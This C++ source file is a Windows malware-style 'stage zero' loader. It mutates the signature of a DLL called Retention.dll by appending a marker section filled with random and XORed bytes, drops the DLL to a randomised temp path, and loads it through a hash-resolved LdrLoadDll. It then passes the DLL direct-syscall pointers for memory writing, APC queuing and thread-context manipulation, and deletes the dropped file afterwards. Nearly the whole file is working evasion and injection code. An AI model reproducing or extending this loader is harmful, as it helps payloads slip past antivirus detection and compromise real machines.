#include "Core.h"
#include <cstring>
#include <fstream>
#include <string>
#include <vector>

#pragma comment(lib, "bcrypt.lib")
#pragma section(".mark", read)
__declspec(allocate(".mark"))
const unsigned char myMarker[] = { 0xDE, 0xAD, 0xBE, 0xEF };

static void LogLine(const wchar_t* text) {
    if (!text) {
        return;
    }

    HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
    if (!out || out == INVALID_HANDLE_VALUE) {
        return;
    }
    DWORD written = 0;
    const DWORD len = static_cast<DWORD>(lstrlenW(text));
    WriteConsoleW(out, text, len, &written, NULL);
    WriteConsoleW(out, L"\r\n", 2, &written, NULL);
}
bool InjectSectionIntoDll(std::vector<unsigned char>& dllBuffer) {
    if (dllBuffer.size() < sizeof(IMAGE_DOS_HEADER)) return false;

    auto* dosHdr = reinterpret_cast<IMAGE_DOS_HEADER*>(dllBuffer.data());
    if (dosHdr->e_magic != IMAGE_DOS_SIGNATURE) return false;

    auto* ntHdrs = reinterpret_cast<IMAGE_NT_HEADERS64*>(
        dllBuffer.data() + dosHdr->e_lfanew);
    if (ntHdrs->Signature != IMAGE_NT_SIGNATURE) return false;

    // Берём последнюю секцию
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHdrs);
    WORD numSections = ntHdrs->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER* lastSection = &sections[numSections - 1];

    // Заполняем новую секцию
    IMAGE_SECTION_HEADER newSection = {};
    memcpy(newSection.Name, ".mark\0\0\0", 8);

    const unsigned char marker[] = { 0xDE, 0xAD, 0xBE, 0xEF };
    const DWORD fileAlign = ntHdrs->OptionalHeader.FileAlignment;
    const DWORD sectAlign = ntHdrs->OptionalHeader.SectionAlignment;

    // Выравниваем оффсет
    DWORD rawOffset = lastSection->PointerToRawData + lastSection->SizeOfRawData;
    rawOffset = (rawOffset + fileAlign - 1) & ~(fileAlign - 1);

    DWORD virtAddr = lastSection->VirtualAddress + lastSection->Misc.VirtualSize;
    virtAddr = (virtAddr + sectAlign - 1) & ~(sectAlign - 1);

    newSection.PointerToRawData = rawOffset;
    newSection.SizeOfRawData = fileAlign; // минимум один блок
    newSection.VirtualAddress = virtAddr;
    newSection.Misc.VirtualSize = sizeof(marker);
    newSection.Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_INITIALIZED_DATA;

    // Добавляем заголовок секции
    BYTE* newSectionHdr = reinterpret_cast<BYTE*>(&sections[numSections]);
    memcpy(newSectionHdr, &newSection, sizeof(IMAGE_SECTION_HEADER));

    // Обновляем счётчик секций и SizeOfImage
    ntHdrs->FileHeader.NumberOfSections++;
    ntHdrs->OptionalHeader.SizeOfImage = virtAddr + sectAlign;

    // Расширяем буфер и пишем данные секции
    dllBuffer.resize(rawOffset + fileAlign, 0x00);
    memcpy(dllBuffer.data() + rawOffset, marker, sizeof(marker));

    return true;
}
void InitUnicodeDllName(UNICODE_STRING* us, wchar_t* name) {
    us->Buffer = name;
    us->Length = static_cast<USHORT>(wcslen(name) * sizeof(wchar_t));
    us->MaximumLength = us->Length + sizeof(wchar_t);
}
// Resolve LdrLoadDll from ntdll using the project’s hashed export resolver.
LdrLoadDll ResolveLdrLoadDll() {
    return reinterpret_cast<LdrLoadDll>(Fog::Core::GetExportAddress(ntdllBase, Fog::Core::HASH_LDR_LOAD_DLL));
}

std::vector<unsigned char> ReadDllToBuffer(const std::wstring& filePath) {
    // Open the file: binary + jump to the end
        std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    
        if (!file.is_open()) {
            return {}; 
        }
        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);
        std::vector<unsigned char> buffer(size);
        if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
            return buffer;
        }
    
        return {};
    }
const unsigned char magic_pattern[] = { 0xDE, 0xAD, 0xBE, 0xEF };
unsigned char* find_junk_buffer(unsigned char* dll_buffer, size_t buffer_size) {
    if (!dll_buffer || buffer_size < sizeof(magic_pattern)) {
        return nullptr;
    }

    const size_t lastStart = buffer_size - sizeof(magic_pattern);
    for (size_t i = 0; i <= lastStart; i++) {
        // Compare a piece of memory with our template.
        if (memcmp(dll_buffer + i, magic_pattern, sizeof(magic_pattern)) == 0) {
            // Return the pointer to the location IMMEDIATELY after DEADBEEF.
            return dll_buffer + i + sizeof(magic_pattern);
        }
    }
    return nullptr;
}

bool FillRandomBytes(BYTE* buffer, ULONG size) {
    if (!buffer || size == 0) return false;
    NTSTATUS st = BCryptGenRandom(
        NULL,                           
        buffer,
        size,
        BCRYPT_USE_SYSTEM_PREFERRED_RNG 
    );
    return (st >= 0); // NT_SUCCESS
}

std::wstring BuildRandomTempDllPath() {
    wchar_t tempPath[MAX_PATH] = {};
    const DWORD pathLen = GetTempPathW(MAX_PATH, tempPath);
    if (pathLen == 0 || pathLen >= MAX_PATH) {
        return L"";
    }

    BYTE randomPart[4] = {};
    if (!FillRandomBytes(randomPart, sizeof(randomPart))) {
        return L"";
    }

    wchar_t randomHex[9] = {};
    for (int i = 0; i < 4; ++i) {
        swprintf_s(randomHex + (i * 2), 3, L"%02X", randomPart[i]);
    }

    std::wstring fullPath(tempPath, pathLen);
    fullPath += randomHex;
    fullPath += L".dll";
    return fullPath;
}

bool WriteBufferToFile(const std::wstring& filePath, const std::vector<unsigned char>& buffer) {
    if (filePath.empty() || buffer.empty()) {
        return false;
    }

    HANDLE fileHandle = CreateFileW(
        filePath.c_str(),
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (fileHandle == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD totalWritten = 0;
    const BYTE* data = buffer.data();
    DWORD remaining = static_cast<DWORD>(buffer.size());

    while (remaining > 0) {
        DWORD written = 0;
        if (!WriteFile(fileHandle, data + totalWritten, remaining, &written, NULL)) {
            CloseHandle(fileHandle);
            return false;
        }
        if (written == 0) {
            CloseHandle(fileHandle);
            return false;
        }
        totalWritten += written;
        remaining -= written;
    }

    CloseHandle(fileHandle);
    return true;
}
class IllegalEntrystageZero {
    uintptr_t m_Retention = 0;

public:
    bool Initialize() {
        LogLine(L"[*] Stage 0 initialization...");
        if (!Fog::Core::Initialize()) {
            LogLine(L"[-] Fog::Core::Initialize failed.");
            return false;
        }
        LogLine(L"[+] Syscall table initialized.");
        return true;
    }

private:
    bool EnsureNtdllLoaded() {
        if (!ntdllBase) {
            ntdllBase = Fog::Core::GetModuleBase(L"ntdll.dll");
        }
        return ntdllBase != 0;
    }
    void FillBridge(SYSCALL_BRIDGE* bridge) {
        if (!bridge) {
            return;
        }
        bridge->NtAllocateVirtualMemory = reinterpret_cast<uintptr_t>(Syscall_NtAllocateVirtualMemory);
        bridge->NtFreeVirtualMemory = reinterpret_cast<uintptr_t>(Syscall_NtFreeVirtualMemory);
        bridge->NtProtectVirtualMemory = reinterpret_cast<uintptr_t>(Syscall_NtProtectVirtualMemory);
        bridge->NtReadVirtualMemory = reinterpret_cast<uintptr_t>(Syscall_NtReadVirtualMemory);
        bridge->NtWriteVirtualMemory = reinterpret_cast<uintptr_t>(Syscall_NtWriteVirtualMemory);
        bridge->NtQueryVirtualMemory = reinterpret_cast<uintptr_t>(Syscall_NtQueryVirtualMemory);
        bridge->NtMapViewOfSection = reinterpret_cast<uintptr_t>(Syscall_NtMapViewOfSection);

        bridge->NtOpenProcess = reinterpret_cast<uintptr_t>(Syscall_NtOpenProcess);
        bridge->NtDuplicateObject = reinterpret_cast<uintptr_t>(Syscall_NtDuplicateObject);
        bridge->NtQueryInformationProcess = reinterpret_cast<uintptr_t>(Syscall_NtQueryInformationProcess);
        bridge->NtQuerySystemInformation = reinterpret_cast<uintptr_t>(Syscall_NtQuerySystemInformation);

        bridge->NtQueueApcThread = reinterpret_cast<uintptr_t>(Syscall_NtQueueApcThread);
        bridge->NtGetContextThread = reinterpret_cast<uintptr_t>(Syscall_NtGetContextThread);
        bridge->NtSetContextThread = reinterpret_cast<uintptr_t>(Syscall_NtSetContextThread);
        bridge->NtResumeThread = reinterpret_cast<uintptr_t>(Syscall_NtResumeThread);
        bridge->NtSuspendThread = reinterpret_cast<uintptr_t>(Syscall_NtSuspendThread);

        bridge->NtFlushInstructionCache = reinterpret_cast<uintptr_t>(Syscall_NtFlushInstructionCache);
        bridge->NtClose = reinterpret_cast<uintptr_t>(Syscall_NtClose);

        bridge->RtlAddVectoredExceptionHandler = RtlAddVectoredExceptionHandlerAddr;
        bridge->RtlRemoveVectoredExceptionHandler = RtlRemoveVectoredExceptionHandlerAddr;
    }

public:
    void InjectPayload() {
        LogLine(L"[*] Loading Retention.dll...");
        if (!EnsureNtdllLoaded()) {
            LogLine(L"[-] ntdll base not resolved.");
            return;
        }
        auto dllBuffer = ReadDllToBuffer(L"Retention.dll");
        if (dllBuffer.empty()) return;
        if (!InjectSectionIntoDll(dllBuffer)) {
            LogLine(L"[-] Failed to inject marker section.");
            return;
        }
        unsigned char* junkPointer = find_junk_buffer(dllBuffer.data(), dllBuffer.size());
        // Look for the marker. If absent, abort to avoid null dereference below.
        if (!junkPointer) {
            LogLine(L"[-] Marker DEADBEEF not found in DLL buffer.");
            return;
        }

        // Never write past the end of the DLL buffer.
        const size_t markerOffset = static_cast<size_t>(junkPointer - dllBuffer.data());
        const size_t bytesAvailable = dllBuffer.size() - markerOffset;
        const size_t randomJunkSize = (bytesAvailable < (64ull * 1024ull)) ? bytesAvailable : (64ull * 1024ull);
        if (randomJunkSize == 0 || !FillRandomBytes(junkPointer, static_cast<ULONG>(randomJunkSize))) {
            LogLine(L"[-] Failed to mutate signature bytes.");
            return;
        }
        LogLine(L"[*] Signature mutated successfully.");

        const std::wstring randomizedDllPath = BuildRandomTempDllPath();
        if (randomizedDllPath.empty()) {
            LogLine(L"[-] Failed to build randomized temp dll path.");
            return;
        }
        LogLine(randomizedDllPath.c_str());

        BYTE key[32] = {0};
        if (!FillRandomBytes(key, sizeof(key))) {
            LogLine(L"[-] Failed to generate XOR key.");
            return;
        }
        const size_t xorLen = (bytesAvailable < sizeof(key)) ? bytesAvailable : sizeof(key);
        for (size_t i = 0; i < xorLen; i++) {
            junkPointer[i] ^= key[i];
        }

        if (!WriteBufferToFile(randomizedDllPath, dllBuffer)) {
            LogLine(L"[-] Failed to write randomized DLL to temp path.");
            return;
        }

        LdrLoadDll pLdrLoadDll = ResolveLdrLoadDll();
        if (!pLdrLoadDll) {
            LogLine(L"[-] LdrLoadDll export not found.");
            return;
        }

        wchar_t* dllName = const_cast<wchar_t*>(randomizedDllPath.c_str());
        UNICODE_STRING us = {};
        InitUnicodeDllName(&us, dllName);

        HANDLE hCore = NULL;
        const NTSTATUS st = pLdrLoadDll(NULL, NULL, &us, &hCore);
        if (st != 0 || !hCore) {
            LogLine(L"[-] LdrLoadDll(Retention.dll) failed.");
            DeleteFileW(randomizedDllPath.c_str());
            return;
        }

        m_Retention = reinterpret_cast<uintptr_t>(hCore);

        const uintptr_t initAddr =
            Fog::Core::GetExportAddress(m_Retention, Fog::Core::HashString("InitializeCore"));
        if (!initAddr) {
            LogLine(L"[-] InitializeCore export not found.");
            return;
        }

        const auto initCore = reinterpret_cast<InitializeCore_t>(initAddr);

        SYSCALL_BRIDGE bridge = {};
        FillBridge(&bridge);
        if (!bridge.RtlAddVectoredExceptionHandler || !bridge.RtlRemoveVectoredExceptionHandler) {
            LogLine(L"[-] Bridge Rtl* pointers are zero (hashes / Fog::Core::Initialize).");
        }
        initCore(&bridge, GetCurrentProcess());
        if (!DeleteFileW(randomizedDllPath.c_str())) {
            LogLine(L"[*] File locked, scheduling deletion on reboot.");
            MoveFileExW(randomizedDllPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
        }
        LogLine(L"[+] InitializeCore called.");
    }
    
};

int main() {

    LogLine(L"[*] Endless_chase start.");
    IllegalEntrystageZero loader;

    if (loader.Initialize()) {
        loader.InjectPayload();
      

    } else {
        LogLine(L"[-] Loader initialization failed.");
    }
    LogLine(L"[*] Press DEL to exit.");
    while (!GetAsyncKeyState(VK_DELETE)) {
		Sleep(100);
    }
    LogLine(L"[+] Exit.");
    return 0;
}